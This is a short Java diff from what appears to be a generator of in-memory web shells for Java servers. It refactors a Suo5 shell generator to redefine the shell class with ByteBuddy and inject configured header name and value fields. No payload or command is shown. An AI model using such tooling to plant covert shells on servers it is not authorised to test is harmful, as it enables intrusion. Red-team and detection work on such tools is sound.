@@ -2,6 +2,7 @@ package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.Suo5Config;
+import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
@@ -17,8 +18,9 @@ public class Suo5Generator extends ByteBuddyShellGenerator<Suo5Config> {
     }
 
     @Override
-    protected DynamicType.Builder<?> build(DynamicType.Builder<?> builder) {
-        return builder
+    protected DynamicType.Builder<?> getBuilder() {
+        return new ByteBuddy()
+                .redefine(shellToolConfig.getShellClass())
                 .field(named("headerName")).value(shellToolConfig.getHeaderName())
                 .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
     }
